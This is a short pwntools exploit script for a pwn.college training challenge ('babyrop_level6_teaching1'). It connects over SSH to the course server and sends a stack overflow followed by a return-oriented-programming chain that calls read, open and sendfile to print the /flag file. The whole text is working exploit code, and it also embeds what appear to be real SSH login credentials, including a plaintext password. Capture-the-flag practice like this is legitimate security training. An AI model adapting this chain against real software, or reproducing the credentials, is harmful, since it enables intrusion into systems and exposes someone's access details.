from pwn import *

e = ELF('./babyrop_level6_teaching1')
libc = ELF('../../libc6_2.31-0ubuntu9.2_amd64.so')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../csec',port=22,password='djaxod12')

p = s.run('/babyrop_level6_teaching1')
# p = e.process(env={"LD_PRELOAD":libc.path})

rdi = 0x0000000000401eeb
rsi = 0x0000000000401ed3
rdx = 0x0000000000401edb
rcx = 0x0000000000401ee3

pay = b'A' * 0x58

pay += p64(rdi) + p64(0) + p64(rsi) + p64(e.bss() + 0x100) + p64(rdx) + p64(8) + p64(e.plt['read'])
pay += p64(rdi) + p64(e.bss() + 0x100) + p64(rsi) + p64(0) + p64(e.plt['open'])
pay += p64(rdi) + p64(1) + p64(rsi) + p64(3) + p64(rdx) + p64(0) + p64(rcx) + p64(100) + p64(e.plt['sendfile'])

p.sendafter(b'\n\n',pay)
p.recvuntil(b'Exiting!\n')

p.send(b'/flag\x00')

p.interactive()